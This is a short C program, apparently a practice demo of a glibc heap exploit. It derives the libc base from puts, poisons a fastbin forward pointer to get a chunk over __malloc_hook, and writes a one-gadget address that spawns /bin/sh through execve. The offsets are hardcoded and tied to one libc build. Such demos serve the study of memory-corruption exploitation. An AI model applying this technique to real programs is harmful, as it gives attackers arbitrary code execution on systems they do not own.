
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{

    puts("relocation puts");
    size_t libc_addr=puts-0x67870;
    printf("puts_addr %p\n",puts);
    printf("libc_addr %p\n",libc_addr);
    size_t* malloc_hook=libc_addr+0x39bb10;
    size_t* realloc_hook=libc_addr+0x39bb10-0x8;
    size_t* malloc_hook_23=libc_addr+0x39bb10-0x23;//0xfff7736260000000	0x000000000000007f
    size_t* malloc_hook_23_data=libc_addr+0x39bb10-0x23+0x10;
    size_t* onegadget=libc_addr+0x3f3e6;
    size_t* __libc_realloc_off_addr=libc_addr+0x78d00+0x6;
// 0xd5c07 execve("/bin/sh", rsp+0x70, environ)
// constraints:
//   [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv



    printf("&malloc_hook-0x23 %p\n",malloc_hook_23);
    printf("&malloc_hook-0x23+0x10 %p\n",malloc_hook_23_data);
    size_t* chunk=malloc(0x60);
    malloc(0x60); // next not top
    free(chunk);
    chunk[0]=malloc_hook_23;
    malloc(0x60);
    size_t* dest_chunk=malloc(0x60);
    printf("dest_chunk %p\n",dest_chunk);
    *(size_t*)((char*)dest_chunk+3+8)=onegadget;
    *(size_t*)((char*)dest_chunk+3+8+8)=__libc_realloc_off_addr;
     printf("__libc_realloc_off_addr %p\n",__libc_realloc_off_addr);
    malloc(0x10);
}